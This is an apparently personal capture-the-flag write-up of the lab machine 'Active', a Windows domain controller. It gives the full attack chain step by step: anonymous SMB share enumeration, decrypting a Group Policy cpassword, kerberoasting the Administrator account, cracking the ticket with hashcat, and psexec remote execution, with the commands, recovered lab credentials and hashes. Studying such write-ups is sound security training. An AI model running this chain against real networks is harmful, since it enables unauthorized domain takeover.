# Box: Active

> Damiano Gubiani | 30/4/2026

export box ip

```bash
export IP='10.129.28.230'
```

# Enumeration

## NMAP

running nmap to scan for open ports

command:

```bash
sudo nmap -sSCV -oN nmap/fst -T4 -vv --min-rate 10000 $IP
```

output:

```
Nmap scan report for 10.129.28.230
Host is up, received reset ttl 127 (0.027s latency).
Scanned at 2026-04-30 10:16:03 EDT for 69s
Not shown: 983 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-30 14:16:09Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 37164/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15066/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25405/udp): CLEAN (Timeout)
|   Check 4 (port 14905/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-04-30T14:17:03
|_  start_date: 2026-04-30T14:14:17
|_clock-skew: 0s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:17
Completed NSE at 10:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:17
Completed NSE at 10:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:17
Completed NSE at 10:17, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.95 seconds
           Raw packets sent: 1714 (75.392KB) | Rcvd: 1001 (40.108KB)

```

with this scan we can assume the machine is a domain controller, looking at the output we can scavange the domain name

Domain and Host name

> active.htb
> DC.active.htb

we add this to out host file

```bash
echo '10.129.28.230 active.htb DC.active.htb' | sudo tee -a /etc/hosts 
```

after that i scanned for the smb share that are available to the machine

## SMB

to list the shares i used the nxc command with anonymous login since we dont get a user and password

command:

```bash
nxc smb DC.active.htb -u '' -p '' --shares
```

output:

![](screen/Pasted%20image%2020260430163600.png)

we can read the Replication folder so we connect to it with smbclient and check whats inside with the command

```bash
smbclient -N \\\\DC.active.htb\\Replication
```

# Exploit
## CPASSWORD

after checking the teams i stumble upon a file that contains a cpassword for the user svc_tgs,
the path to the file is the following

> Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

this is the content of the file

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

after checking online for a potential decriptor of the password i found a github repo that ihas a script just for that

link:

> https://github.com/sAsPeCt488/cpass-decrypt

i cloned the repo and installed the dependencies than i run the script with the cpassword and got credentials

> svc_tgs : GPPstillStandingStrong2k18

and after checking the nxc ldap with the new credentials we got a match instead of an error

![](screen/Pasted%20image%2020260430170124.png)

lets run a bloodhound query to understand the AD environment with the following command

```bash
nxc ldap DC.active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --bloodhound --collect all --dns-server $IP
```

i than upload the file to bloodhound and find something interesting

## Bloodhound

we know that thers only 2 user in this DC wich are svc_tgs and the administrator, i enumerated the administration user and i found out that he has an SPN wich means he is a kerberoastable user

![](screen/Pasted%20image%2020260430172944.png)

so i run a targeted kerberost attack to the administrator account and got an output

command

```bash
nxc ldap DC.active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --kerberoast kerb --kerberoast-account Administrator 
```

we got the administrator ticket

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$9bf22fd13c810988ea67d39ab5e6f57b$777b87da72a70d521cbff3395921401f8237cc3c6e04e34ccd361b1f1318d9014105fa0d4fc4d7f1ea87d5582791b207d8a74c51c01885c56a901f91ad5a8dc7484455009918753fdcc5a2bd5424828a3a44d5b8bd0f37268ab129c3d0890d8b41469861a7aa93db1dd798d84d26f964625aaf2e4d701c9e78554c3b5029ff8589e8afa8da90a1cf58150b80ebf4528b0503d97823b9aa0ef84220bb79e51d0d8dd7ff1d31a92cc7b37bf807059fe73b32ca39b01ee9db952d1784769cbc5b4cf902bf05c40dc63c485eb8fa5e54632e44407fb7e795a16c32a912ddbc67656f7187cca45785517b54387ac28d471e313f4a6373ff810dee2b114a44a1dc7be902b67d4a7b39210ceebc85958e3e9426d5f0dccdf166e71d693459fded61b8b7a6365a814b98b24f3ff061ae94633dc7d9629e4dcefd41c8ac059f910a7b4b55de273863ae337289fb1a66259529eb0c8033b7af7dcbafde624277cedcc33cd27e83b74585f7102f8520f47c4dd42069365bb169d2ab2dc34117384f7807efc20abc25e9a0690e9bc4ddd397f9b2302d6abd7af2101d6a4f77126636d721417b9730377840a61137c668655bc0731876dcb9f2869749b8ace787c5c7e569f9f088b2934e5409a5e39d4eb7c3fcbdb179dad63af52e7e02d0e22e48068c5afb81f1253f90e51df412d72585e8feef2a12a39f323153b8962288698d71f84ed8531739b55dbfcdcf7c52ea96be67dcf9094583fb60d9789a3a88555ed1f9117421d98086e7d2a81ce0aa8c9704744238429339341951e7f7ea4167b751639cf4c53ff5ea3e81bac7da4da172e2a5783b17f4032649be80eb32e49c45471e876230969ee2ac8a589da0c0f12303229d52e824406b757f7ba7ce8535187f50fefbf20caa457fbea246ffc11ec03e7707a4470ecfd6b35f865206f835aedc7a7117fe5861eca707a51ae273b32cfe84311d43a1dbac1871150109f4f50ee68bfe3d21214600e5cd44d17cc3a08b3f21999894739ae577065e01187c06a65fccd68a266d9cdef18fa9a194fe579ae3d687f9b7925c610b2022f05358d4158f33a037eeebe5dc964d1c1aaf0f4534e7a5f43d1aad2a44aa0cdc04c0cc6cedfcdbc875f91545af860d07e5ca9f049334e6d5ae7787f9d4037bcfa0f53434b41ba1577eb09f29405df6dc1e4039a352d373ce66bfc9ca38869b4a17627761de73a6626090cbe1d673fcc4852dca84db35a03ebb973b306fe24fa52e832121
```

i ran a hashcat bruteforce on the ticket to get the password from it

command

```bash
hashcat -m 13100 -a 0 kerb /usr/share/wordlists/rockyou.txt
```

and we got a match

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$a5ce8c45132bb550e94152f25b9707e3$221b728bb096a4e150fb2ff380500c234948f0d71307ccce935f04bfb91f9a9c8f9d02294e93029a1c255cb7a10169a705d23d716c08f789d5ff2c894751df670a76c701ea6b79e9e63a39decd24718d2cc100da338bbdb76d27261b16421225b1c6c4d2cf2537a77861b2587ab2ecf82199f843e723a8350f86a61bdfc1c06fa1264a317e49559f2203c6c3429fb6b37e1d68a874b031183ab16aa3d4ec9bb23b821e027cf1bb0d3577a181675852aae723a0dd9c453637ac8e78f20d1e14289aa7bafa64c5f5d7d26a53d727fbcf8ae34f49f69fe53090a75bb3b9b5d5ae5f5af1d1843f2b705c9fec12af76f65136bc38c09b1b6545d0dbbdc4f656c8c2ba392e53d290928ab95043530b83503013954af65a10df30170b64fb210af0c1a85f1bfc2392d99ef3b594eddc16d325fee1056cc3e008004492ffae4d344bfe2aa1f6842b78732a3207037dd7cc2365bd8755bbf59bfcf3b11edf6310ab7677c8866e7db1de679991400e4662c022b3790c4e7b7856663f5b5cdbd263c226349fb705f791574dad5b24460ee966e5e031217144cce6e32fcb6e1a8d23c9cc2b047d402b316e647ec3429a4a6a3bcd75050241ff76a4305849b0278094646f468c16485d63eeb8a0da88488a0f00464c61210608791ac1e82b12d3b2354bcfeb08089024bd8a56b37edc7a5816a9f8c3edc96b7b97d5025a2477121436fed665d38f6fdd41ad2b4dd79644ffdf340e3e4e3a741500df91d83703df6bbf4edda4e6e84907f309a873b36abaa723dca78a44cd7b09b9bee2485fbf21de2964ba6fb0f133d83d42e044b8bcc11e6fa53eca5b606ef188cf229e00c81eaf6bdf0b711d7d0329a085a48a2bed2013859383a0284a75c3ad74a34d355969b57e3c649feebcd2ab2f3cea83a90e8e3a8b9e5680c005252fc1664acc2496f52883979447b888f741374b0c7fd8a21b730c9dd118363ad7951e4ad538d3b6ff852f5b35f48f53dc6d6097f6007fede615ed8c0a5cb0fbe9dc3a553e1b3d9d0fca7e6d959942f19fd2e08d403d4e16d76687b600bd562e7eea87b3c4e03fb3f00bb3cc10b384d1be7aea6b0114cfd951eb757c24e4f70238f973b52c7f083b16c7cfac85d3f9a26bf3cc7a21d622cbaf53f061381267eb2bf437a2011d6dd3075606158c7798247070d7b940c0d1908d50f8e36089a3188b4091ebe62ab7da4422a999a8e6e0478a24a85b2f8945042177cb5d66d5cf52e3a66ea5059c4e2b04:Ticketmaster1968
```

credentials we got

> administrator : Ticketmaster1968

and after that with psexec we got RCE on the DC

command

```bash
impacket-psexec 'active.htb'/'administrator':'Ticketmaster1968'@'10.129.28.230'
```

output

![](screen/Pasted%20image%2020260430174759.png)